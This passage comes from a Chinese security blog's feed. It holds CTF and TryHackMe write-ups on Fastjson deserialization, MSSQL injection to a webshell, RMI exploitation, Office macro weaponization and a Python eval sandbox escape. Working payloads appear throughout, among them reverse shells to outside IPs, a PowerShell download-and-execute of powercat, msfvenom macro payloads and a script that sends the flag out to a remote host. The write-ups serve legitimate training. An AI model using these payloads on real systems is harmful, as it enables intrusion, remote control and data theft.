class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;编码\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发；</p><h4 id="动态加载字节码分析"><a href="#动态加载字节码分析" class="headerlink" title="动态加载字节码分析"></a>动态加载字节码分析</h4><p>这里的话在我之前写过得一篇文章也有写这个  <a href="https://ke1nys.github.io/posts/30ead299.html">Java安全之BCEL ClassLoader</a></p><p>首先分析后半部分 即<code>TemplatesImpl</code>中的链子<br>由上文我们知道 ，fastjson使用<code>JSON.parseObject</code>方法反序列化会调用get 和set方法<br>在<code>TemplatesImpl</code>中属性的get和set方法中<br><code>getOutputProperties</code>方法调用了<code>newTransformer</code>方法</p><p><img src="../images/image-20230517160245013.png" alt="image-20230517160245013"></p><p>在<code>newTransformer</code>中调用了<code>getTransletInstance</code>方法</p><p><img src="../images/image-20230517161405853.png" alt="image-20230517161405853"></p><p>这里需要调用到<code>defineTransletClasses</code>所以需要使<code>_name!=null,_class == null</code></p><p><img src="../images/image-20230517161442419.png" alt="image-20230517161442419"></p><p>在defineTransletClasses中 重写了defineClass方法 对<code>_bytecodes</code>中的恶意代码进行加载</p><p><img src="../images/image-20230517161528118.png" alt="image-20230517161528118"></p><p>这部分其实就是CC4 的后半部分</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/12096#toc-3&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里用的是fastjson 1.2.24版本来进行分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230510112535</summary>
      
    
    
    
    
    <category term="java-fastjson 链子分析" scheme="https://ke1nys.github.io/tags/java-fastjson-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Mini-L CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/fbdb0624.html"/>
    <id>https://ke1nys.github.io/posts/fbdb0624.html</id>
    <published>2023-05-09T13:00:52.000Z</published>
    <updated>2023-05-14T08:01:08.946Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话只复现部分题</p><p><a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp地址</a></p><h2 id="ezsql-sql-server-mssql"><a href="#ezsql-sql-server-mssql" class="headerlink" title="ezsql(sql server mssql)"></a>ezsql(sql server mssql)</h2><p><img src="../images/image-20230509212213754.png" alt="image-20230509212213754"></p><p><img src="../images/image-20230509213811523.png" alt="image-20230509213811523"></p><p><strong>考查的是sqlserver</strong> <strong>也是mssql</strong></p><p>这里的话是给了查询语句  <strong>列和表都给了  id users</strong></p><p>数据库查询</p><p><img src="../images/image-20230510105038552.png" alt="image-20230510105038552"></p><p><img src="../images/image-20230510105055721.png" alt="image-20230510105055721"></p><p><strong>查出来是ctf</strong>  在sqlserver中 <strong>数据库是db_name()</strong></p><p>拿出祖传字典fuzz一下，发现过滤了<strong>空格、星号、百分号、引号</strong>以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p><a href="http://www.ppmy.cn/news/9311.html">SQL Server注入技巧与提权方式详解</a></p><p><img src="../images/image-20230509214305648.png" alt="image-20230509214305648"></p><p>可以了解一下这个空格绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ALTER%1eTABLE%1eusers�ADD�wcs�varchar(2000)�NULL;</span><br><span class="line">1;inSert�into�users(id,wcs,name)�values�(17,0x3c3f70687020706870696e666f28293b203f3e,36);</span><br><span class="line">1;declare�@wcs�varchar(2000)�set�@wcs=0x2f7661722f7777772f68746d6c2f6f6b6f6b2e706870�bacKup�log�ctf�to�disk=@wcs�with�init;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230509224513281.png" alt="image-20230509224513281"></p><p><img src="../images/image-20230509224610461.png" alt="image-20230509224610461"></p><p><a href="https://cn-sec.com/archives/1277068.html"><strong>日志备份和差异备份获取webshell</strong></a></p><p><a href="https://www.cnblogs.com/-qing-/p/10910282.html"><strong>Web渗透之mssql差异备份getshell</strong></a></p><p>这里有个小知识点就是得需要bp或则hackbar来写，输入框的话是不能解析url编码的，因为我们需要用url编码来进行空格的绕过</p><p><img src="../images/image-20230511095149341.png" alt="image-20230511095149341"></p><h2 id="minijava-RMI反序列化漏洞"><a href="#minijava-RMI反序列化漏洞" class="headerlink" title="minijava(RMI反序列化漏洞)"></a>minijava(<strong>RMI反序列化漏洞</strong>)</h2><p><img src="../images/image-20230511095830489.png" alt="image-20230511095830489"></p><p><strong>先使用jd-gui工具把class文件变成java文件</strong></p><p><img src="../images/image-20230513152909440.png" alt="image-20230513152909440"></p><p>1.先导入pom.xml里面的东西</p><p>2.然后按照jar包里面的构造来idea里面构造个一模一样的</p><p>然后在把jar里面的内容照搬进去就行了</p><p>这道题如果是对经常做java题目的师傅来看的话是一下就能看出是利用RMI来打的</p><p><img src="../images/image-20230511101201537.png" alt=" "></p><p>先去查看一下pom.xml，发现是cc3的链子</p><p><img src="../images/image-20230511102446188.png" alt="image-20230511102446188"></p><p>因为这里添加了个白名单过滤，所以说不能直接用cc3来打了</p><p>然后去看了一下MainController.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = false)</span> String data)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[] userData = Base64.getDecoder().decode(data);</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(userData), <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      user = (User)serialKiller.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;unserialize error, no!&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unserialize done, &quot;</span> + user.getUsername() + <span class="string">&quot; have fun!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就去查看这个readObject() 这里显示是User这个类里边的</p><p><img src="../images/image-20230511102938179.png" alt="image-20230511102938179"></p><p>这里边的registry和lookup做题多的一看就知道是rmi恶意服务</p><p>这里的话registry1可控，然后只需要绕过上面的的if判断就行了</p><p>然后打<strong>RMI反序列化漏洞</strong>，最终可以实现绕过白名单任意反序列化，从而打CC链来rce</p><p><strong>这里如果是是用hackbar发包的话，得注意要进行url编码，不会会失败</strong></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>需要在自己的服务器上执行</strong></p><p>接下来就不写了  直接去看官方的wp吧 <a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp</a></p><p>接下来就写篇文章来学习一下<strong>RMI</strong>和<strong>cc3</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话只复现部分题&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md&quot;&gt;官方wp地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezsql-sql-ser</summary>
      
    
    
    
    
    <category term="Mini-L CTF web 复现" scheme="https://ke1nys.github.io/tags/Mini-L-CTF-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>thm-红队-初始访问-武器化</title>
    <link href="https://ke1nys.github.io/posts/add7d84.html"/>
    <id>https://ke1nys.github.io/posts/add7d84.html</id>
    <published>2023-05-08T15:06:25.000Z</published>
    <updated>2023-05-14T13:33:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>前两个是 VBScript 代码  和  HTA代码</p><p>前者是可以在本地上运行，后者是可以弹shell也可以在本地运行</p><h3 id="应用程序的-Visual-Basic-VBA"><a href="#应用程序的-Visual-Basic-VBA" class="headerlink" title="应用程序的 Visual Basic (VBA)"></a>应用程序的 Visual Basic (VBA)</h3><p><strong>这是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实施的一种编程语言</strong></p><p><strong>VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</strong> </p><p>这句话是重点</p><p><strong>宏是 Microsoft Office 应用程序，其中包含以称为 Visual Basic for Applications (VBA) 的编程语言编写的嵌入式代码。它用于创建自定义功能，以通过创建自动化流程来加速手动任务</strong></p><p><strong>我们将讨论 VBA 的基础知识以及对手使用宏创建恶意 Microsoft 文档的方式</strong>。</p><p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个 宏。目的是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择 视图→ 宏来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏</p><p><img src="../images/image-20230508231520977.png" alt="image-20230508231520977"></p><p><img src="../images/image-20230508231606126.png" alt="image-20230508231606126"></p><p>点击创建后的样子</p><p>然后进行内容创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后点击运行<img src="../images/image-20230508231803055.png" alt="image-20230508231803055"></p><p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>重要的是要注意，要使宏起作用，我们需要将其保存为启用宏的格式，例如.doc 和 docm。现在让我们将文件保存为Word 97-2003 模板，通过转到文件→保存 Document1并保存为类型 → Word 97-2003 文档启用 宏，最后保存.</p><p><img src="../images/image-20230508232155649.png" alt="image-20230508232155649"></p><p>运行文档后就会自动执行</p><p><strong><img src="../images/image-20230508232335996.png" alt="image-20230508232335996"></strong></p><p>现在编辑 word 文档并创建一个执行calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>和前面保存的步骤一样，然后点击运行就弹出计算器了</p><p>得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身并不能绕过任何检测</p><p><strong>接下来是利用VBA进行shell的反弹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of vba file: 2698 bytes</span><br></pre></td></tr></table></figure><p><strong>导入以注意</strong>需要进行一项修改才能使此工作正常进行。输出将在 MS Excel 工作表上工作。因此，将 Workbook_Open()更改为 Document_Open()以使其适用于 MS word 文档。</p><p>然后把生成的代码写到word的宏编辑器里边</p><p>然后设置监听器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15</span><br><span class="line">LHOST =&gt; 10.50.159.15</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.50.159.15:443 </span><br></pre></td></tr></table></figure><p>一旦在受害者机器上打开恶意  word 文档，我们应该会收到一个反向 shell。</p><h3 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell-PSH"></a>PowerShell-PSH</h3><p><strong>Powershell 是使用 .NET 框架构建的 Windows 脚本语言和 shell 环境</strong>。</p><p>这也允许 Powershell 直接从其 shell 执行 .NET 函数。大多数 Powershell 命令（称为<em>cmdlet）</em>是用 .NET 编写的。<em>与其他脚本语言和 shell 环境不同，这些cmdlet</em>的输出 是对象——使 Powershell 有点面向对象。这也意味着运行 cmdlet 允许您对输出对象执行操作（这样可以方便地将输出从一个<em>cmdlet</em>传递 到另一个）。<em>cmdlet</em>的正常格式使用<strong>Verb-Noun</strong>表示；例如，用于列出命令的<em>cmdlet</em> 被称为<code>Get-Command.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><p>将文件另存为 thm.ps1 。 使用 Write-Output ，我们打印消息“Welcome to the Weaponization Room!” 到命令提示符。 现在让我们运行它并查看结果</p><p><img src="../images/image-20230514205635490.png" alt="image-20230514205635490"></p><p>PowerShell 的执行策略是一个 安全选项，用于保护系统免于运行恶意脚本。默认情况下，Microsoft出于安全目的禁止执行PowerShell脚本.ps1 。PowerShell执行策略设置为Restricted ，这意味着它允许单独的命令但不允许运行任何脚本</p><p><strong>bypass绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure><p>现在，让我们尝试使用一种用PowerShell编写的工具powercat来获取反向 shell 。在你的 AttackBox 上，从 GitHub 下载它并运行一个网络服务器来传送有效载荷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure><p>现在，我们需要在该 AttackBox 上设置一个 Web 服务器来为将在目标机器上下载和执行的powercat.ps1提供服务。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在我们的例子中，我们将使用端口 8080 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ cd powercat</span><br><span class="line">user@machine$ python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure><p>在 AttackBox 上，我们需要使用nc监听端口1337以接收来自受害者的连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ nc -lvp 1337</span><br></pre></td></tr></table></figure><p>现在，我们从受害机器上下载有效载荷并使用PowerShell有效载荷执行它，如下所示，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><p>现在我们已经执行了上面的命令，受害者机器从我们的网络服务器（在 AttackBox 上）下载 powercat.ps1有效载荷，然后使用cmd.exe 在目标本地执行它，并将连接发送回正在侦听的 AttackBox在端口1337上。几秒钟后，我们应该收到连接回调：</p><p><img src="../images/image-20230514211059473.png" alt="image-20230514211059473"></p><p><strong>HTA VBA powershell</strong>  这三种方式可以进行shell的反弹   在windows系统里</p><p>前两个使用mvf进行生成payload  后面一个是依靠github上面的一个文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前两个是 VBScript 代码  和  HTA代码&lt;/p&gt;
&lt;p&gt;前者是可以在本地上运行，后者是可以弹shell也可以在本地运行&lt;/p&gt;
&lt;h3 id=&quot;应用程序的-Visual-Basic-VBA&quot;&gt;&lt;a href=&quot;#应用程序的-Visual-Basic-VBA&quot; c</summary>
      
    
    
    
    
    <category term="thm-红队-初始访问-武器化" scheme="https://ke1nys.github.io/tags/thm-%E7%BA%A2%E9%98%9F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-%E6%AD%A6%E5%99%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>AntCTF x D³CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/d27bfad9.html"/>
    <id>https://ke1nys.github.io/posts/d27bfad9.html</id>
    <published>2023-05-02T07:30:06.000Z</published>
    <updated>2023-05-07T09:40:34.530Z</updated>
    
    <content type="html"><![CDATA[<p>这里的复现都是去网上搜索前几名发的wp来复现的</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">亚军wp</a></p><p>还有参考 <a href="https://boogipop.com/">boogipop的wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>题目</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> 题目还给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话就是自己想方法进行绕过了</p><p>最后是在eval这里进行代码的执行</p><p>因为关键函数被禁了，那么我们可以尝试使用全角符号进行绕过</p><p>迷你上标和下标（0~9、字母、特殊字符）</p><p>用上面的迷你上标或全角符号能能绕过，本地测试过了</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">参考文章</a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>给的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>然后上面执行的是python的shell反弹</p><p>然后就可以在自己的服务器上接收到了</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>题目</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>这里<code>url/admin</code>访问后台，然后弱密码 admin/admin 进行登录</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>发现这文件后，然后进行读取   进行题目的提示和官方文件的对比之后发现多了下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 